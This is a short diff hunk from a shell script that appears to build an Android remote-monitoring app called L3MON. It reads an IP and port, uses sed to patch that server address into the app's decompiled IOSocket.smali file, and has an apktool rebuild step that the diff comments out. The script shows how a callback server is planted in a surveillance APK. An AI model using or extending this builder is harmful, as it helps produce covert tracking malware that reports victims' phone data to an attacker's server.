@@ -16,4 +16,4 @@ read ports
 echo -e "const-string v3, \"http://$ips:$ports?model=\"" >.lmn.txt
 chg=$(cat .lmn.txt)
 sed -i "77 c $chg" $HOME/L3MON/server/app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali
-apktool b $HOME/L3MON/server/app/factory/decompiled/ -o /sdcard/L3mon.apk
+#apktool b $HOME/L3MON/server/app/factory/decompiled/ -o /sdcard/L3mon.apk
